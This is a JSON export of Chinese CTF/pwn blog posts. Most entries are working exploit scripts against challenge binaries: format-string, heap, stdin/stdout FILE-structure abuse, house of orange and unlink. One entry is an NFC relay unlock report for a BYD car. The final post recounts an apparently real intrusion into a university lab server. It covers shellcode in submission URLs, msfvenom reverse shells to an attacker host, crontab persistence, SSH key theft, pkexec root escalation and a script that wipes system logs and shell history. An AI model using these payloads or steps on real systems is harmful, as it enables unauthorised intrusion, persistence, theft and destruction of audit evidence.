[{"title":"复现das二进制专项","url":"/2023/11/19/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/heshi%E4%B8%8Edas%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9%E7%9A%84%E9%82%82%E9%80%85/","content":"\n# foooood（跟我的题思路一模一样，气死）\n\n```\nfrom pwn import *\ncontext(os='linux',arch='amd64')  #need tmux\ncontext.log_level=\"debug\"\n\n# p = remote(\"node4.buuoj.cn\", 26443)\np = process(\"./pwn\")\np.sendlineafter(\"Give me your name:\", b\"/bin/sh\")\n\np.sendlineafter(\"food:\", b'%9$p^%11$p^')\nlibc_base = int(p.recvuntil(\"^\")[10:-1], 16) - 0x20750 - 240  # __libc_start_main\nstack = int(p.recvuntil(\"^\")[:-1], 16)\ni_addr = stack - 0x7ffc0bd8af08 + 0x7ffc0bd8ae40\none = libc_base + 0x45226\nprint(hex(one))\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x30 + 4) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format(1))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hn\".format(one & 0xffff))\n\np.sendlineafter(\"food:\", \"%{}p%11$hn\".format((i_addr - 0x18 + 2) & 0xffff))\n# attach(p)\np.sendlineafter(\"food:\", \"%{}p%37$hhn\".format((one & 0xff0000) // 0x10000))\nfor i in range(8):\n    p.sendlineafter(\"food:\", \"1\")\n# attach(p)\np.sendlineafter(\"food:\", \"1\")\nprint(hex(libc_base))\np.interactive()\n```\n\n另外，居然能循环打印栈，等环境变量FLAG\n\n# easynote（两个大洞，但one不通）\n\nuaf和堆溢出都有做法挺多，后面试试\n\n1.改堆指针表，写free_got，free一个“/bin/sh”(我的exp)\n\n2.reaclloc调栈，跳malloc_hook的one\n\n3.unlinlk\n\n```\nfrom pwn import *\n\ncontext(arch='i386', log_level='debug', os='linux')\nelf=ELF(\"./pwn\")\n\n\ndef malloc(size, contet):\n    p.sendlineafter(\"5. exit\", b'1')\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\ndef free(id):\n    p.sendlineafter(\"5. exit\", b'3')\n    p.sendlineafter(\"--->\", str(id))\n\ndef edit(id,size,contet):\n    p.sendlineafter(\"5. exit\", b'2')\n    p.sendlineafter(\"--->\", str(id))\n    p.sendlineafter(\"--->\", str(size))\n    p.sendafter(\"--->\", contet)\n\ndef show(id):\n    p.sendlineafter(\"5. exit\", b'4')\n    p.sendlineafter(\"--->\", str(id))\n\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn', 26517)\nlibc = ELF('libc-2.23.so')\nmalloc(0x80, b'qwer')\nmalloc(0x80, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'qwer')\nmalloc(0x68, b'/bin/sh')\n\nfree(0)\nshow(0)\np.recvuntil(\":\")\nlibc_base = u64(p.recv(7)[1:] + b'\\0' * 2) - 0x7fef613c4b78 + 0x7fef61000000\nsystem = libc_base + libc.sym[\"system\"]\nfree_got = elf.got['free']\n# pause()\nfree(2)\nfree(3)\nfree(2)\nmalloc(0x68, p64(0x0000000006020C0 - 0x23))\nmalloc(0x68, 'ase')\nmalloc(0x68, 'ase')\nprint(hex(libc_base))\nprint(hex(free_got))\nmalloc(0x68, b'a' * (0x23 - 0x10) + p64(free_got))\n# attach(p)\nedit(0, 10, p64(system))\np.sendlineafter(\"5. exit\", b'3')\np.sendlineafter(\"--->\", b'4')\np.interactive()\n```\n","categories":["刷题"],"tags":["DAS"]},{"title":"_IO_2_1_stdin_结构体利用","url":"/2024/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/IO_2_1_stdin%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/","content":"\n\n\n# _IO_2_1_stdin_结构体利用\n\n## 利用方法\n\n修改输入函数的目标地址，从而任意地址写\n\n## **使用条件**\n\n可以控制 _IO_stdin 结构体\n\n## 前置知识\n\n```cpp\nstruct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n```\n\n## **主要思路**\n\n设置 _IO_read_end 等于 _IO_read_ptr\n\n设置 _flag &~ _IO_NO_READS 即 _flag &~ 0x4\n\n设置 _fileno 为 0\n\n设置 _IO_buf_base 为 write_start ， _IO_buf_end 为 write_end 且\n\n使得 _IO_buf_end-_IO_buf_base ⼤于将要使⽤io函数读⼊的内容\n\n在下⼀次读⼊就可以从 _IO_buf_base 开始写⼊，实现任意写。\n\n## 例题和exp\n\n### 题\n\n```\nhttp://10.81.2.230:5244/d/CTF%E9%A2%98%E7%9B%AE/null%E7%9A%84%E9%A2%98/_IO_2_1_stdin_?sign=Qs8BzWq5MM2AtC9bJjWHHlJlHb7ZiTeG1mQ3RHl71Jc=:0\n```\n\n### exp\n\n```\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\nlibc = ELF(\"/home/heshi/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so\")\n# p = remote(\"127.0.0.1\",10000)\np = process(\"./pwn\")\n\n'''\n\n一堆跟程序交互的函数，不用管\n\n'''\ndef dbg():\n    attach(p,'''\n    \n    p _IO_2_1_stdin_\n    \n    ''')\n    pause()\ndef cmd(c):\n    p.sendlineafter(\">> \",str(c))\ndef gift(addr):\n    cmd(1)\n    p.sendafter(b\"addr: \",p64(addr))\ndef trigger(ctt):\n    cmd(2)\n    p.send(ctt)\ndef getchar():\n    cmd(4)\ndef check():\n    cmd(3)\n\n\n'''\n拿了些白送的信息\n'''\np.recvuntil(b'gift: ')\nprintf_addr = int(p.recv(14),16)\nlibc_base = printf_addr - libc.sym['printf']\nstdin = libc_base + libc.sym['_IO_2_1_stdin_']\np.recvuntil(b'backdoor: ')\nbackdoor = int(p.recv(14),16)\nfunc = backdoor + 0x2d67\nsuccess(\"printf_addr: \"+hex(printf_addr))\nsuccess(\"libc_base: \"+hex(libc_base))\nsuccess(\"stdin: \"+hex(stdin))\nsuccess(\"backdoor: \"+hex(backdoor))\nsuccess(\"func: \"+hex(func))\n\n\n'''\n这部分是精髓\n'''\n\ngift(stdin+56) # 篡改_IO_buf_base 满足第一个条件：_IO_buf_base指向非零，并便于修改_IO_buf_base\n\ntrigger(p64(libc_base-0x7fccf4cd0000+0x7fccf5094963)*3+p64(func)) #前面三个算一下，使其不变，篡改_IO_buf_base到func\n\nfor i in range(32):#不断读入，移动_IO_read_ptr，使满足_IO_read_end 等于 _IO_read_ptr\n    getchar()\n\ntrigger(p64(backdoor)) #进行一次输入函数，此时scanf目标地址已修改到func，篡改为 backdoor即可\n\ncheck()#作最后的检查，拿shell\n\np.interactive()\n```\n\n\n\n## 参考资料\n\nhttps://www.anquanke.com/post/id/194577\n\nhttps://ywhkkx.github.io/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/\n\n","categories":["刷题"],"tags":["ctfpunk"]},{"title":"_IO_2_1_stdout_结构体利用","url":"/2024/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/IO_2_1_stdout%E5%88%A9%E7%94%A8/","content":"\n# _IO_2_1_stdout_结构体利用\n\n## 利用方法\n\n修改输出函数的目标地址，从而任意地址读\n\n## **使用条件**\n\n可以控制 _IO_stdout 结构体前0x30\n\n## 前置知识\n\n```cpp\nstruct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n```\n\n## **主要思路**\n\n比stdin简单多了，设置_flag=0xfbad1800\n\n后面3个p64(0)填充read\n\n篡改_IO_write_base为想输出的首地址，_IO_write_ptr为尾地址\n\n## 例题和exp\n\n### 题\n\n```\nhttp://10.81.2.230:5244/d/CTF%E9%A2%98%E7%9B%AE/CTFPUNK/Pwn/%E5%9F%BA%E7%A1%80Linux%E7%94%A8%E6%88%B7%E6%80%81Pwn/GLIBC%20IO_FILE/IO_stdout%E4%BB%BB%E6%84%8F%E8%AF%BB/pwn?sign=6t2qdTHPAg2cyWzel3lZOdxbmWLnaT2KEKULwD4yRG4=:0\n```\n\n### exp\n\n```\nfrom pwn import *\nse = lambda data :p.send(data)\nsa = lambda delim,data :p.sendafter(delim, data)\nsl = lambda data :p.sendline(data)\nsla = lambda delim,data :p.sendlineafter(delim, data)\nsea = lambda delim,data :p.sendafter(delim, data)\nrc = lambda numb=4096 :p.recv(numb)\nru = lambda delims, drop=True :p.recvuntil(delims, drop)\nuu32 = lambda data :u32(data.ljust(4, '\\0'))\nuu64 = lambda data :u64(data.ljust(8, '\\0'))\nlg = lambda name,data :p.success(name + ': \\033[1;36m 0x%x \\033[0m' % data)\n\ndef dbg():\n    attach(p, '''\n\n    p _IO_2_1_stdin_\n\n    ''')\n    pause()\n\n# p = process('./pwn')\nelf = ELF('./pwn')\ncontext(arch = elf.arch, os = 'linux',log_level = 'debug')\n\np = remote('121.199.64.23', 27511)\n\n\nru('gift: ')\nlibc_base = int(ru('\\n'), 16) - 0x79bf0\n_IO_2_1_stdout_ = libc_base + 0x1d95c0\n\nru('flag:')\nflag = int(ru('\\n'), 16)\n\nlg('libc', libc_base)\nlg('_IO_2_1_stdout_', _IO_2_1_stdout_)\n\nse(p64(_IO_2_1_stdout_))\nse(p64(0xfbad1800) + p64(0) * 3 + p64(flag) + p64(flag + 0x100))\n\np.interactive()\n```\n\n\n\n## 参考资料\n\nhttps://www.cnblogs.com/pwnfeifei/p/15793432.html\n\nhttps://bbs.kanxue.com/thread-272098.htm#msg_header_h3_14\n","categories":["刷题"],"tags":["ctfpunk"]},{"title":"house_of_orange","url":"/2024/06/18/IO_file/house_of_orange/","content":"\n# house_of_orange\n\n## 利用条件\n\n无free，可改topchunk\n\n## 前置知识\n\n### 理清IO链\n\n```\nmalloc_printerr --> __libc_message --> abort --> _IO_flush_all_lockp --> _IO_OVERFLOW\n```\n\n这条函数调用链中，只有_IO_OVERFLOW，需要我们构造触发条件，条件如下：\n\n```\nif (\n\t\t( \n        \t(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || \n        \t\t(\n        \t\t_IO_vtable_offset (fp) == 0 && fp->_mode > 0 &&\n        \t\t\t(\n                        fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base\n                    )\n        \t\t)\n\t  \t)\n\t  && _IO_OVERFLOW (fp, EOF) == EOF\n    )\nresult = EOF;\n```\n\n观察上面的代码发现，如果我们要想执行_IO_OVERFLOW (fp, EOF)就需要让最外面的if中&&前面的那部分成立，而这部分中间又用了一个||来连接两个条件，分别是`(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base`和`_IO_vtable_offset (fp) == 0 && fp->_mode > 0 &&  (fp->_wide_data->_IO_write_ptr>  fp->_wide_data->_IO_write_base`\n 这两部分条件任意满足一处即可，前面那个部分的条件满足起来很省事，我们只需要让mode=0,_IO_write_ptr=1,_IO_write_base=0即可(这仨值改成其他的也行，只需要满足条件即可)，这样就会触发_IO_OVERFLOW。\n\n## 利用思路\n\n### 控制IO结构体\n\n利用topchunk堆拓展，将先前的topchunk放入unsorted bin，然后打一个unsorted bin attack，将main_arena+88（unsortedbin）写入_IO_list_all，如果我们在 _IO_list_all 利用 unsorted bin attack 写入 main_arena_88  ，那么，main_arena_88 就会被当成一个 _IO_FILE 结构体，而 main_arena_88 + 0x68 =  main_arena_C0 ，也就是 _IO_FILE 结构体中存放 chain 指针的地方，也是存放 0x60 大小 small bin  第一个 free chunk 地址的地方，如果我们伪造一个 small bin 为 _IO_FILE 结构体，那么我们就能够准确地劫持程序了，只需要让unsorted bin attack过后的chunk，携带着fake_IO，进入smallbin，等到这条IO链触发，即可篡改虚表函数并写入参数\n\n### 构造fake_IO\n\n我们将IO_FILE结构体落在我们可控的内存上，这就意味着我们是可以控制vtable的，**我们将vtable中的_IO_overflow函数地址改成system地址即可**，而这个函数的第一个参数就是IO_FILE结构体的地址，因此我们让IO_FILE结构体中的flags成员为/bin/sh字符串，那么当**执行exit函数**或者**libc执行abort流程时**或者**程序从main函数返回时**触发了_IO_flush_all_lockp即可拿到shell\n\n思路理清之后构造fake_IO\n\n```\nfake_IO+=b'/bin/sh\\x00'+p64(0x61) \t\t#old top chunk prev_size & size 同时也是fake file的_flags字段\nfake_IO+=p64(0)+p64(_IO_list_all-0x10)  #old top chunk fd & bk\nfake_IO+=p64(0)+p64(1)\t\t\t  \t\t#_IO_write_base & _IO_write_ptr\nfake_IO+=p64(0)*21\t\t\t\t  \t\t#填充\nfake_IO+=p64(heap_base+0xf50+0xc8)\t\t#指向system地址即可，就是下面这个\nfake_IO+=p64(system)              \t\t#留一个system地址，等调用\n```\n\n### 触发IO链\n\n先前已经用unsorted bin攻击，unsorted bin 已被破坏\n\n只需要再申请一个其他bin里没有的大小，即可触发\n\n```\nmalloc_printerr --> __libc_message --> abort --> _IO_flush_all_lockp --> _IO_OVERFLOW\n```\n\n```python\nfrom pwn import *\nfrom std_pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug',terminal=['tmux','splitw','-h'])\nelf = ELF(\"./eznote\")\ngetProcess(\"ctf.qwq.cc\",13148,'./eznote')\nlibc = ELF(\"./libc-2.23.so\")\n\ndef add(size,content):\n\tsla(b'choice :', '1')\n\tsla(b'Length of Note : ', str(size))\n\tsa(b'Content of Note:',content)\n\ndef edit(index,content):\n\tsla(b'choice :', '2')\n\tsla(b'Index :', str(index))\n\tsla(b'Length of Note :',str(len(content)))\n\tsa(b'Content of Note :',content)\n\ndef show(index):\n\tsla(b'choice :', '3')\n\tsla(b'Index :', str(index))\n\nru(\"A gift for you~: \")\ngift=int(rl()[:-1],16)\nheap_base=gift-0x55ae50c07010+0x55ae50c07000\nadd(0x10,b'123')\nedit(0,b'a'*0x18+p64(0xb1))\nadd(0x100,b'123')\nedit(0,b'a'*0x20)\nshow(0)\nlibc_base=uu64(ru(\"\\x7f\")[-6:])-0x7fa03df29b78+0x7fa03db65000\nlog(libc_base)\n_IO_list_all=libc_base+libc.sym['_IO_list_all']\nsystem=libc_base + libc.sym['system']\n\npayload = b'a' * 0x10\n\npayload+=b'/bin/sh\\x00'+p64(0x61) \t\t#old top chunk prev_size & size 同时也是fake file的_flags字段\npayload+=p64(0)+p64(_IO_list_all-0x10)  #old top chunk fd & bk\npayload+=p64(0)+p64(1)\t\t\t  \t\t#_IO_write_base & _IO_write_ptr\npayload+=p64(0)*21\t\t\t\t  \t\t#填充\npayload+=p64(heap_base+0xf50+0xc8)\t\t#指向system地址即可，就是下面这个\npayload+=p64(system)              \t\t#留一个system地址，等调用\n\n\nedit(0,payload)\nlog(gift)\ngdba()\nsla(b'choice :', '1')\nsla(b'Length of Note : ', str())\n\nita()\n```","categories":["学习笔记"],"tags":["orange"]},{"title":"Unlink-hitcon2014_stkof","url":"/2024/04/27/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unlink/","content":"\n\n\n# unlink 攻击\n\n## unlink操作原理\n\n当进行smallbinchunk 或者 unsortedchunk合并时，会将在链中的块unlink(解链)出来 \nunlink操作大白话就是说：\n被unlink的块(以后叫它Q)前一个块的bk指向Q的bk\n然后再把Q后一个块的fd指向Q的fd\n\n## 攻击目的\n\n篡改目标地址的指针指向它的地址-0x18\n一般来说用来攻击块的指针表，实现任意地址写\n\n## 攻击方式\n\n会被篡改的位置会被系统识别为一个fd指针，这个位置我们称为 &target\n那么这个块的开头就是 &target+0x10\nfd 是 &target，bk是 &target-0x18\n\nQ的fd 应填为&target - 0x18\nbk应填为 &target - 0x10\n结合unlink图\n最后进行了两次赋值操作\ntarget = &target - 0x10\ntarget = &target - 0x18\n也就也是 最后target 这个地址的值变成了 &target - 0x18\n\n```\n指针表\n\n这个位置      -0x18\n-------     -0x10\np_chunk1    -0x8\np_chunk2  <--往前推0x18\np_chunk3\n\np_chunk4\n```\n\n## 例题\n\nhitcon2014_stkof\n\nexp\n\n```\nfrom pwn import *\nfrom std_pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug',terminal=['tmux','splitw','-h'])\nelf = ELF(\"./stkof\")\nlibc = ELF(\"./libc-2.31.so\")\n\nfree_got = elf.got['free']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n\ndef alloc(size):\n    sl(str(1))\n    sl(str(size))\n    ru(\"OK\")\n\ndef fill(idx,content):\n    sl(str(2))\n    sl(str(idx))\n    sl(str(len(content)))\n    sl(content)\n    ru(\"OK\")\n\ndef free(idx):\n    sl(str(3))\n    sl(str(idx))\n\nalloc(0x30) #隔离前面的块\nalloc(0x30) #放置 fack_chunk , 用来前向合并\nalloc(0x80) #一个unsorted_bin，用堆溢出修改presize\nalloc(0x30) #等等有用\n\n'''\nunlink 攻击:\n当进行smallbinchunk 或者 unsortedchunk合并时，会将在链中的块unlink(解链)出来 \nunlink操作大白话就是说：\n被unlink的块(以后叫它Q)前一个块的bk指向Q的bk\n然后再把Q后一个块的fd指向Q的fd\n攻击目标：\n篡改目标地址的指针变成一个指向它周围的指针\n一般来说用来攻击块的指针表，实现任意地址写\n攻击方式:\n\n会被篡改的位置会被系统识别为一个fd指针，这个位置我们称为 &target\n那么这个块的开头就是 &target+0x10\nfd 是 &target，bk是 &target-0x18\n\nQ的fd 应填为&target - 0x18\nbk应填为 &target - 0x10\n结合unlink图\n最后进行了两次赋值操作\ntarget = &target - 0x10\ntarget = &target - 0x18\n也就也是 最后target 这个地址的值变成了 &target - 0x18\n'''\n\n'''\n指针表\n\n这个位置      -0x18\n-------     -0x10\np_chunk1    -0x8\np_chunk2  <--往前推0x18\np_chunk3\np_chunk4\n-------\n\n'''\n\ntarget = 0x602150 # 这个位置在 指针表里 是chunk2的指针地址  根据前面的理论，会把 上图所示地址放入 chunk2指针中\nfd = target - 0x18 #这部分是死的\nbk = target - 0x10\n\n\npayload = p64(0)+p64(0x31)\npayload +=p64(fd)+p64(bk)\npayload +=0x10*b\"a\"\npayload +=p64(0x30)+p64(0x90) #溢出修改pre_size 多修改一字节，防止回车进入size\nfill(2,payload) #布置堆，为free以后前向合并 fake_chunk准备\n# gdba()\nfree(3) #释放一个unsortedchunk，触发前向合并\n# print(\"get\")\n# pause()\n\n'''\n.got.plt:0000000000602018 40 41 E0 00 00 00 00 00       off_602018 dq offset free               ; DATA XREF: _free↑r\n.got.plt:0000000000602020 48 41 E0 00 00 00 00 00       off_602020 dq offset puts               ; DATA XREF: _puts↑r\n.got.plt:0000000000602028 50 41 E0 00 00 00 00 00       off_602028 dq offset fread              ; DATA XREF: _fread↑r\n'''\npayload = b'a'*0x10 + p64(free_got) +p64(puts_got)  # 踩坑 fill修改的是 p+0x10  因为默认malloc返回chunk开头，而fill修改\nfill(2,payload) # 这个时候chunk2 指针已经被修改 到了指针表上头    修改chunk1指针使其指向free的got表，等等用fill（1，context）修改 free 和puts的plt\nfill(1,p64(puts_plt))# 修改 free的got到puts\ngdba()\nfree(2)#输出 puts_got\nputs_addr=uu64(ru(\"\\x7f\")[-6:])\nlog(puts_addr)\nlibc_base=puts_addr - libc.sym['puts']\nsystem_addr =libc_base+libc.sym['system']\nlog(libc_base)\nfill(1,p64(system_addr))\nfill(4,b'/bin/sh\\0')\nfree(4)\np.interactive()\n#终于通了，凑个一百行\n```","categories":["刷题"],"tags":["unlink"]},{"title":"BYD Dolphin has an NFC relay attack vulnerability","url":"/2024/03/05/%E6%BC%8F%E6%B4%9E/%E6%AF%94%E4%BA%9A%E8%BF%AA/","content":"\n## **Vulnerability Description**\n\nReproduction requires tools\n\nTwo attacking machines: Android devices, correctly configured with NFCGATE: https://github.com/nfcgate/nfcgate\n\nOne server: Configured with NFCGATE relay (official NFCGATE setup is available)\n\nOne victim device: NFC car key configured on a BYD Ocean\n\nOne victim car: Vulnerability confirmed on the \"Dolphin\" model\n\nReproduction process:\n\nStart the server and connect the  two attacking machines in relay mode. One machine selects reader mode,  the other selects tag mode. The attacking machine in tag mode approaches the car's NFC card reader.\n\nThe attacking machine in reader mode is placed close to the victim device.\n\nOnce the attacking machine is near  the victim device, the victim's NFC key is automatically activated and  relayed to the tag. The tag interacts with the car, successfully  unlocking it.\n","categories":["CVE"],"tags":["CVE"]},{"title":"渗透csapp lab3","url":"/2024/06/18/%E6%BC%8F%E6%B4%9E/%E6%B8%97%E9%80%8Fcsapp%20lab3/","content":"\n\n\n# 渗透csapp lab3\n\n## 源码审计\n\nida逆向源码得到提交格式\n\n```\nhttp://10.12.13.30:18224/csapp/submitr.pl/?userid=<学号>&password=<密码>&lab=<随便填个数字>&result=1:<cookie>:<我们的输出，用十六进制数加空格表示二进制>&submit=submit\n```\n\n## 本地测试\n\n先通过python脚本，调试出可以在本地引起CPU爆满的payload（每个学号对应的缓冲区地址不一样，提前测试好，确认可以rce。在buf里面填入二进制炸弹）\n\n```\nfrom pwn import *                           #引入pwn库，方便和bufbomb互动\ncontext.log_level=\"debug\"                   #debug模式，可以看到交互时的输入输出\np=process([\"./bufbomb_\",\"-u\",\"2023302646\",'-p','666666','-s'])#将实验题和需要的参数打包成对象，其中”-s”代表提交\n# attach(p,'''\n#        finish\n#        finish\n#        finish\n#        finish\n#        finish\n#        ''')#在下次交互时设置断点\n# pause()#暂停，输入任意键接着运行,\nbuf=asm(\"sub esp,0x300\")\n\nbuf += b\"\\xbf\\x14\\xe3\\x39\\x24\\xda\\xda\\xd9\\x74\\x24\\xf4\\x58\"\nbuf += b\"\\x33\\xc9\\xb1\\x1f\\x31\\x78\\x15\\x83\\xe8\\xfc\\x03\\x78\"\nbuf += b\"\\x11\\xe2\\xe1\\x89\\x33\\x7a\\x38\\x95\\xb3\\x61\\x69\\x6a\"\nbuf += b\"\\x6f\\x0c\\x8f\\xdc\\xe9\\x59\\x6e\\xd1\\x76\\xce\\x2b\\x82\"\nbuf += b\"\\x59\\x92\\xa2\\x9c\\xce\\x56\\x34\\x3e\\x45\\xde\\xd5\\x2a\"\nbuf += b\"\\x3f\\xb8\\x45\\xfa\\xe8\\xb1\\x84\\xbf\\xdb\\x42\\xc3\\x80\"\nbuf += b\"\\x9d\\x5b\\x85\\x74\\x63\\x34\\xbb\\x75\\x9b\\xc4\\xe3\\x1f\"\nbuf += b\"\\x9b\\xae\\x16\\x69\\x78\\x1f\\xd1\\xa4\\xff\\xe5\\x21\\x4f\"\nbuf += b\"\\xbd\\x0d\\x86\\x02\\xba\\x68\\xc8\\x72\\xc5\\x8a\\x41\\x91\"\nbuf += b\"\\x04\\x61\\x5d\\x97\\x64\\x7a\\xed\\x6a\\xa6\\x03\\x88\\x55\"\nbuf += b\"\\x40\\x14\\xc9\\xdc\\x50\\x8d\\x5f\\xb4\\x22\\xad\\x52\\xc9\"\nbuf += b\"\\xc6\\x72\\x14\\xc8\\x37\\x93\\x5c\\xcd\\xc7\\x54\\x9c\\x75\"\nbuf += b\"\\xc6\\x54\\x9c\\x89\\x04\\xd4\"\n\npayload=24*b'a'+b'b'*20+p32(0x55683b28)#+buf\n\np.sendlineafter(\":\",payload)\np.interactive()#将程序的交互权从脚本交给用户\n```\n\n把学号密码和payload代入提交格式（下面的是反弹shell的马，并非二进制炸弹）举个例子罢了\n\n```\nhttp://10.12.13.30:18224/csapp/submitr.pl/?userid=2023302753&password=666666&lab=123&result=1:335a79b1:61%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2061%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2062%2028%203b%2068%2055%2081%20ec%2000%2003%2000%2000%20ba%2067%2044%20c5%2016%20d9%20ee%20d9%2074%2024%20f4%205e%2031%20c9%20b1%201f%2031%2056%2015%2003%2056%2015%2083%20c6%2004%20e2%2092%202e%20cf%2048%206d%2074%2038%2097%20de%20c9%2094%2032%20e2%207d%207c%204a%2003%20b0%2001%20db%2098%2023%2008%20c4%2003%20a0%2064%2006%203b%20d7%203e%208f%20da%208d%20d8%20d7%204c%2003%2072%2061%208d%20e0%20b1%20f1%20c8%2027%2030%20eb%209c%20d3%20fe%2063%2082%201c%2001%2074%209a%2076%2001%201e%201f%200e%20e2%20ef%20d6%20dd%2065%208a%2028%20a4%20d8%207e%208f%20e5%2024%2038%20cf%2019%202b%203a%2046%20fa%20ea%20d1%2054%203c%200f%2029%20d4%20c3%201d%20b2%2091%20fc%20e6%20a3%20c2%2075%20f7%205d%2046%20ef%2048%205e%206b%2070%202d%20a1%200b%2073%20d1%20c3%2053%2072%202d%2004%20a3%20ce%202c%2004%20a3%2030%20e2%2084%200a&submit=submit\n```\n\n本地测试，访问同构的url，发现服务器崩溃，rce确实存在\n\n## 正式攻击\n\n此时将buf换为msf构造的反弹shell的马，重新构造url即可\n\n用msfconsole连接马\n\n```\nuse exploit/multi/handler\nset PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST 10.12.13.30\nset LPORT 15213\nexploit\n```\n\n发现马并不持久，总是一闪而过，已知该主机有perl和python写入一个python马\n\n```\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.32.29.20 LPORT=8010 -b \"\\x0a\" -a x86 --platform linux  -f python > shellcode.txt\n```\n\n再连接python马，实现无限时间的shell\n\n上传一个马，写入定时任务，做一个初步持久化\n\n```\ncrontab -e 编辑计划任务\n```\n\n使用msf的exp，夺取ssh证书，拿到ssh权限\n\n## 提权\n\n随后在一个夜深人静的晚上，开始测试提权\n\n发现了一个特好用的辅助提权工具\n\n###  linux-exploit-suggester\n\n#### 下载\n\n```shell\ngit clone https://github.com/The-Z-Labs/linux-exploit-suggester.git\n```\n\n#### 使用\n\n```\n#1.评估当前Linux在公开的已知漏洞上的曝光情况:\n$ ./linux-exploit-suggester.sh\n#2.显示当前Linux机器上安全功能的状态\n$ ./linux-exploit-suggester.sh --checksec\n#3.根据提供的'uname'字符串(即uname -a命令的输出)评估Linux内核在公开已知漏洞中的暴露情况\n$ ./linux-exploit-suggester.sh --uname <uname-string>\n```\n\n发现了一个范围特广的提权漏洞\n\n### CVE-2021-4034  polkit（pkexec）提权漏洞\n\nhttps://cloud.tencent.com/developer/article/1945253\n\n获得root权限\n\n### 权限维持\n\n上传一个马到root文件夹.restart\n\n写入定时任务 **正向shell注意带上timeout**否则会不断开好多，导致无法连接\n\n完成权限维持后\n\n### 清除痕迹（这个清的不干净，网络连接信息没清掉，后面找个详细的）\n\n```\n#!/usr/bin/bash\necho > /var/log/syslog\necho > /var/log/messages\necho > /var/log/httpd/access_log\necho > /var/log/httpd/error_log\necho > /var/log/xferlog\necho > /var/log/secure\necho > /var/log/auth.log\necho > /var/log/user.log\necho > /var/log/wtmp\necho > /var/log/lastlog\necho > /var/log/btmp\necho > /var/run/utmp\nrm ~/./bash_history\nhistory 